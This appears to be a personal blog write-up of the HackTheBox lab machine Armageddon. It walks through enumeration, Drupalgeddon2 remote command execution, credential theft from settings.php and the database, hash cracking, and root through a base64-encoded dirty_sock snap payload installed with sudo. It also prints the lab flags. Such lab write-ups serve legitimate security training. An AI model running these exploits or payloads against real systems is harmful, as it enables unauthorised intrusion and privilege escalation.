---
layout: post
title: "Armagadon Writeup - HackTheBox"
category: HackTheBox
---


# HTB lab Machine - Armagadon

I started of reverting the machine, and then ran my self made script https://github.com/yassirlaaouissi/EZEA. The exact results can be found in the results/10.129.48.89 folder that I have attached to this post.

## Enumeration summary

![image-20210503082453122](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210503082453122.png)


```
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
  <title>Welcome to  Armageddon |  Armageddon</title>
  <style type="text/css" media="all">
```

```
PORT      STATE         SERVICE
7/udp     open|filtered echo
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
161/udp   open|filtered snmp
427/udp   open|filtered svrloc
518/udp   open|filtered ntalk
631/udp   open|filtered ipp
996/udp   open|filtered vsinet
1026/udp  open|filtered win-rpc
1030/udp  open|filtered iad1
1718/udp  open|filtered h225gatedisc
1719/udp  open|filtered h323gatestat
1813/udp  open|filtered radacct
5000/udp  open|filtered upnp
20031/udp open|filtered bakbonenetvault
32769/udp open|filtered filenet-rpc
32815/udp open|filtered unknown
49152/udp open|filtered unknown
49182/udp open|filtered unknown
49186/udp open|filtered unknown
49190/udp open|filtered unknown
49193/udp open|filtered unknown
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)

80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```

```
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.48.89
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.48.89:80/
|     Form id: user-login-form
|     Form action: /?q=node&destination=node
|     
|     Path: http://10.129.48.89:80/?q=user/password
|     Form id: user-pass
|     Form action: /?q=user/password
|     
|     Path: http://10.129.48.89:80/?q=user/register
|     Form id: user-register-form
|     Form action: /?q=user/register
|     
|     Path: http://10.129.48.89:80/?q=node&amp;destination=node
|     Form id: user-login-form
|     Form action: /?q=node&destination=node%3Famp%253Bdestination%3Dnode
|     
|     Path: http://10.129.48.89:80/?q=user
|     Form id: user-login
|     Form action: /?q=user
|     
|     Path: http://10.129.48.89:80/?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode
|     Form id: user-login-form
|     Form action: /?q=node&destination=node%3Famp%253Bdestination%3Dnode%253Famp%25253Bdestination%253Dnode
|     
|     Path: http://10.129.48.89:80/?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode%253Famp%25253Bdestination%253Dnode
|     Form id: user-login-form
|_    Form action: /?q=node&destination=node%3Famp%253Bdestination%3Dnode%253Famp%25253Bdestination%253Dnode%25253Famp%2525253Bdestination%25253Dnode
|_http-dombased-xss: Couldn't find any DOM based XSS.

| http-enum: 
|   /robots.txt: Robots file
|   /.gitignore: Revision control ignore file
|   /UPGRADE.txt: Drupal file
|   /INSTALL.txt: Drupal file
|   /INSTALL.mysql.txt: Drupal file
|   /INSTALL.pgsql.txt: Drupal file
|   /CHANGELOG.txt: Drupal v1
|   /: Drupal version 7 
|   /README.txt: Interesting, a readme.
|   /icons/: Potentially interesting folder w/ directory listing
|   /includes/: Potentially interesting folder w/ directory listing
|   /misc/: Potentially interesting folder w/ directory listing
|   /modules/: Potentially interesting folder w/ directory listing
|   /scripts/: Potentially interesting folder w/ directory listing
|   /sites/: Potentially interesting folder w/ directory listing
|_  /themes/: Potentially interesting folder w/ directory listing
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16

| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.129.48.89:80/misc/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.48.89:80/misc/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.48.89:80/misc/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.48.89:80/misc/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.48.89:80/misc/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://10.129.48.89:80/misc/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.129.48.89:80/misc/?C=S%3bO%3dA%27%20OR%20sqlspider
|_    http://10.129.48.89:80/misc/?C=N%3bO%3dA%27%20OR%20sqlspider
```

```
+ OSVDB-3092: /web.config: ASP config file is accessible.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /misc/: This might be interesting...
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3092: /UPGRADE.txt: Default file found.
+ OSVDB-3092: /install.php: Drupal install.php file found.
+ OSVDB-3092: /install.php: install.php file found.
+ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ OSVDB-3233: /INSTALL.mysql.txt: Drupal installation file found.
+ OSVDB-3233: /INSTALL.pgsql.txt: Drupal installation file found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3268: /sites/: Directory indexing found.
+ /.gitignore: .gitignore file found. It is possible to grasp the directory structure.
```

```
+ Uncommon header 'x-generator' found, with contents: Drupal 7 (http://drupal.org)
+ OSVDB-3268: /scripts/: Directory indexing found.
+ OSVDB-3268: /includes/: Directory indexing found.
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /misc/: Directory indexing found.
+ Entry '/misc/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /modules/: Directory indexing found.
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /profiles/: Directory indexing found.
+ Entry '/profiles/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/scripts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /themes/: Directory indexing found.
+ Entry '/themes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.mysql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.pgsql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/INSTALL.sqlite.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/install.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/LICENSE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/MAINTAINERS.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/UPGRADE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/xmlrpc.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/?q=user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
```

```
| http-auth-finder: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.48.89
|   url                                                                               method
|   http://10.129.48.89:80/                                                           FORM
|   http://10.129.48.89:80/?q=node&amp;destination=node                               FORM
|   http://10.129.48.89:80/?q=user                                                    FORM
|_  http://10.129.48.89:80/?q=node&amp;destination=node%3Famp%253Bdestination%3Dnode  FORM
```

```
Summary   : PoweredBy[Arnageddon], MetaGenerator[Drupal 7 (http://drupal.org)], Content-Language[en], JQuery, Drupal, Script[text/javascript], PasswordField[pass], Apache[2.4.6], X-Frame-Options[SAMEORIGIN], UncommonHeaders[x-content-type-options,x-generator], PHP[5.4.16], HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], X-Powered-By[PHP/5.4.16]
```

```
CHANGELOG.TXT
Drupal 7.56, 2017-06-21
-----------------------
- Fixed security issues (access bypass). See SA-CORE-2017-003.
```



## Exploitation

Lets just start from the top, the login form is not admin:admin sadly. And drupal does not seem to have very much shocking CVE's: https://www.cvedetails.com/vulnerability-list.php?vendor_id=1367&product_id=2387&version_id=112037&page=1&hasexp=0&opdos=0&opec=0&opov=0&opcsrf=0&opgpriv=0&opsqli=0&opxss=0&opdirt=0&opmemc=0&ophttprs=0&opbyp=0&opfileinc=0&opginf=0&cvssscoremin=0&cvssscoremax=0&year=0&month=0&cweid=0&order=3&trc=69&sha=f0a90c95b70745cd752cea13269918cc8f9f9b82

But I did find this exploit: https://github.com/dreadlocked/Drupalgeddon2 The ruby version did not work. So I tried this python version: https://github.com/lorddemon/drupalgeddon2

```
kali@kali:~/Desktop/DownloadedScripts$ python drupalgeddon2.py -h http://10.129.48.89 -c 'whoami'
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
apache

kali@kali:~/Desktop/DownloadedScripts$ python drupalgeddon2.py -h http://10.129.48.89 -c 'ls -al'
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
total 284
drwxr-xr-x.  9 apache apache   4096 Dec 14 18:35 .
drwxr-xr-x.  4 root   root       33 Dec  3 10:31 ..
-rw-r--r--.  1 apache apache    317 Jun 21  2017 .editorconfig
-rw-r--r--.  1 apache apache    174 Jun 21  2017 .gitignore
-rw-r--r--.  1 apache apache   6112 Jun 21  2017 .htaccess
-rw-r--r--.  1 apache apache 111613 Jun 21  2017 CHANGELOG.txt
-rw-r--r--.  1 apache apache   1481 Jun 21  2017 COPYRIGHT.txt
-rw-r--r--.  1 apache apache   1717 Jun 21  2017 INSTALL.mysql.txt
-rw-r--r--.  1 apache apache   1874 Jun 21  2017 INSTALL.pgsql.txt
-rw-r--r--.  1 apache apache   1298 Jun 21  2017 INSTALL.sqlite.txt
-rw-r--r--.  1 apache apache  17995 Jun 21  2017 INSTALL.txt
-rw-r--r--.  1 apache apache  18092 Nov 16  2016 LICENSE.txt
-rw-r--r--.  1 apache apache   8710 Jun 21  2017 MAINTAINERS.txt
-rw-r--r--.  1 apache apache   5382 Jun 21  2017 README.txt
-rw-r--r--.  1 apache apache  10123 Jun 21  2017 UPGRADE.txt
-rw-r--r--.  1 apache apache   6604 Jun 21  2017 authorize.php
-rw-r--r--.  1 apache apache    720 Jun 21  2017 cron.php
drwxr-xr-x.  4 apache apache   4096 Jun 21  2017 includes
-rw-r--r--.  1 apache apache    529 Jun 21  2017 index.php
-rw-r--r--.  1 apache apache    703 Jun 21  2017 install.php
drwxr-xr-x.  4 apache apache   4096 Dec  4 10:10 misc
drwxr-xr-x. 42 apache apache   4096 Jun 21  2017 modules
drwxr-xr-x.  5 apache apache     70 Jun 21  2017 profiles
-rw-r--r--.  1 apache apache   2189 Jun 21  2017 robots.txt
drwxr-xr-x.  2 apache apache    261 Jun 21  2017 scripts
drwxr-xr-x.  4 apache apache     75 Jun 21  2017 sites
drwxr-xr-x.  7 apache apache     94 Jun 21  2017 themes
-rw-r--r--.  1 apache apache  19986 Jun 21  2017 update.php
-rw-r--r--.  1 apache apache   2200 Jun 21  2017 web.config
-rw-r--r--.  1 apache apache    417 Jun 21  2017 xmlrpc.php

kali@kali:~/Desktop/DownloadedScripts$ 

```

Lol lets spawn a shell and we have initial foothold:

![image-20210503085841038](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210503085841038.png)

```
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
```

I would like to do PE, but SE Linux is probably enabled:

![image-20210503091105856](https://raw.githubusercontent.com/yassirlaaouissi/yassirlaaouissi.github.io/master/_screenshots/image-20210503091105856.png)

So I have to find a way to execute shell scripts while SE linux is on. Lets enumerate:

```
cat settings.php

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

$drupal_hash_salt = '4S4JNzmn8lq4rqErTvcFlV4irAJoNqUmYy_d24JEyns';

```

Cant connect to the mysql database since the shell is limited as fuck. Thats when I found this: https://serverfault.com/questions/240015/how-do-i-allow-mysql-connections-through-selinux

```
httpd_builtin_scripting --> on
httpd_enable_cgi --> on
httpd_graceful_shutdown --> on
```

But I realised you can launch queries without grabbing shell using the -E flag:

```
mysql -u drupaluser -p CQHEy@9M*m23gBVj -e 'show databases;'
Database
information_schema
drupal
mysql
performance_schema


mysql -u drupaluser -p CQHEy@9M*m23gBVj -e 'select User, Password from mysql.user;'
User	Password
root	*EA33994841F9FCF1F229CBA01A630D7650270021
root	*EA33994841F9FCF1F229CBA01A630D7650270021
root	*EA33994841F9FCF1F229CBA01A630D7650270021
drupaluser	*0F495EDCD7138678F8716222FD7FF0492CAFF884


mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'USE information_schema; SHOW TABLES;'
CHARACTER_SETS
CLIENT_STATISTICS
COLLATIONS
COLLATION_CHARACTER_SET_APPLICABILITY
COLUMNS
COLUMN_PRIVILEGES
ENGINES
EVENTS
FILES
GLOBAL_STATUS
GLOBAL_VARIABLES
INDEX_STATISTICS
KEY_CACHES
KEY_COLUMN_USAGE
PARAMETERS
PARTITIONS
PLUGINS
PROCESSLIST
PROFILING
REFERENTIAL_CONSTRAINTS
ROUTINES
SCHEMATA
SCHEMA_PRIVILEGES
SESSION_STATUS
SESSION_VARIABLES
STATISTICS
TABLES
TABLESPACES
TABLE_CONSTRAINTS
TABLE_PRIVILEGES
TABLE_STATISTICS
TRIGGERS
USER_PRIVILEGES
USER_STATISTICS
VIEWS
INNODB_CMPMEM_RESET
INNODB_RSEG
INNODB_UNDO_LOGS
INNODB_CMPMEM
INNODB_SYS_TABLESTATS
INNODB_LOCK_WAITS
INNODB_INDEX_STATS
INNODB_CMP
INNODB_CMP_RESET
INNODB_CHANGED_PAGES
INNODB_BUFFER_POOL_PAGES
INNODB_TRX
INNODB_BUFFER_POOL_PAGES_INDEX
INNODB_LOCKS
INNODB_BUFFER_POOL_PAGES_BLOB
INNODB_SYS_TABLES
INNODB_SYS_FIELDS
INNODB_SYS_COLUMNS
INNODB_SYS_STATS
INNODB_SYS_FOREIGN
INNODB_SYS_INDEXES
XTRADB_ADMIN_COMMAND
INNODB_TABLE_STATS
INNODB_SYS_FOREIGN_COLS
INNODB_BUFFER_PAGE_LRU
INNODB_BUFFER_POOL_STATS
INNODB_BUFFER_PAGE

mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'USE drupal; SHOW TABLES;'
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog

mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'select name, pass, mail from drupal.users;'
name	pass	mail
brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu

```

Lets crack that shit:

```
kali@kali:~/Desktop/DownloadedScripts$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
1g 0:00:00:00 DONE (2021-05-03 09:57) 2.380g/s 552.3p/s 552.3c/s 552.3C/s tiffany..harley
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Password is booboo, and since ssh is open we can leave this wacky shell:

```
kali@kali:~/Desktop/DownloadedScripts$ ssh brucetherealadmin@10.129.48.89
The authenticity of host '10.129.48.89 (10.129.48.89)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.48.89' (ECDSA) to the list of known hosts.
brucetherealadmin@10.129.48.89's password: 
Last login: Tue Mar 23 12:40:36 2021 from 10.10.14.2
[brucetherealadmin@armageddon ~]$ pwd
/home/brucetherealadmin
[brucetherealadmin@armageddon ~]$ ls
user.txt
[brucetherealadmin@armageddon ~]$ cat user.txt
9f248575dfb8a65c773df4ed37378ec8
[brucetherealadmin@armageddon ~]$ 
```

we are still not root:

```
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) groups=1000(brucetherealadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[brucetherealadmin@armageddon ~]$ ls -al /root
ls: cannot open directory /root: Permission denied
[brucetherealadmin@armageddon ~]$ 

```

Linpeas time:

```
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 3.10.0-1160.6.1.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Tue Nov 17 13:59:11 UTC 2020

[+] Sudo version
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.23

```

```
[+] PATH
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin
New path exported: /usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/var/lib/snapd/snap/bin:/home/brucetherealadmin/.local/bin:/home/brucetherealadmin/bin:/sbin:/bin
```

```
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for brucetherealadmin on armageddon:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User brucetherealadmin may run the following commands on armageddon:
    (root) NOPASSWD: /usr/bin/snap install *

```

Snap is a package manager, aka we can install any package we want as root that is vulnerable. So i chose the one in this exploit: https://www.exploit-db.com/exploits/46361

```
 python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > root.snap  
```

```
[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --devmode root.snap  
dirty-sock 0.1 installed
[brucetherealadmin@armageddon tmp]$ su dirty_sock
Password: dirty_sock
[dirty_sock@armageddon tmp]$ sudo -s

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for dirty_sock: dirty_sock
[root@armageddon tmp]# 
```

```
[root@armageddon ~]# cat root.txt
3c9ad02e11512c0f58fa513e78c66aa5
```

## Final thoughts

Easy 20 pointer, nice box.
